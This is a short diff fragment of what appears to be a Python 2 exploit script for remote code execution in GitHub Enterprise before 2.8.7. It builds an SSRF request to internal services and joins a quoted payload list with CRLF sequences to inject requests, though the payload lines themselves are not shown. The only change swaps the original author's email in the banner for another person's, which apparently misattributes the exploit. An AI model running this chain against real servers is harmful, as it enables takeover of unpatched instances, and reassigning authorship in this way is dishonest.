@@ -18,7 +18,7 @@ payload = [
 payload = map(quote, payload)
 url = 'http://0:8000/composer/send_email?to=basiralizadehazx.se&url=http://127.0.0.1:8080/'
 
-print "\nGitHub Enterprise < 2.8.7 Remote Code Execution by orange@chroot.org"
+print "\nGitHub Enterprise < 2.8.7 Remote Code Execution by basiralizadeh@azx.se"
 print '-'*10 + '\n'
 print url + '%0D%0A'.join(payload)
 print '''
